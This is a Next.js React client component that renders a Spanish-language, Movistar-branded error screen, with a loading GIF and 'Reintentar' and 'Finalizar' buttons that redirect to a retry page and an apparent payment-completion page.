"use client";

import { useState } from "react";
import MovistarHeader from "@/components/MovistarHeader";

type Props = { title: string; message: string };

export default function ErrorClient({ title, message }: Props) {
  const [loading, setLoading] = useState(false);

  function reintentar() {
    setLoading(true);
    window.location.href = "/mov";
  }
  function finalizar() {
    setLoading(true);
    window.location.href = "/pago/finalizado";
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <img src="/movistar/M.gif" alt="Cargando" className="w-48" />
      </div>
    );
  }

  return (
    <div>
      <MovistarHeader />
      <div className="my-6">
        <h3 className="text-center text-lg font-semibold">{title}</h3>
        <div className="text-center text-sm font-medium my-6 text-[#b38f00] w-[90%] mx-auto">
          <p>{message}</p>
        </div>
      </div>
      <div className="flex flex-col md:flex-row gap-4 py-3 w-[80%] mx-auto">
        <button
          onClick={reintentar}
          className="w-full bg-[#0B2739] text-white rounded-full text-sm px-4 py-3 transition-all duration-500"
        >
          Reintentar
        </button>
        <button
          onClick={finalizar}
          className="w-full bg-white text-dark-blue text-sm rounded-full px-4 py-3 border border-gray-200 hover:shadow-md transition-all duration-500"
        >
          Finalizar
        </button>
      </div>
    </div>
  );
}
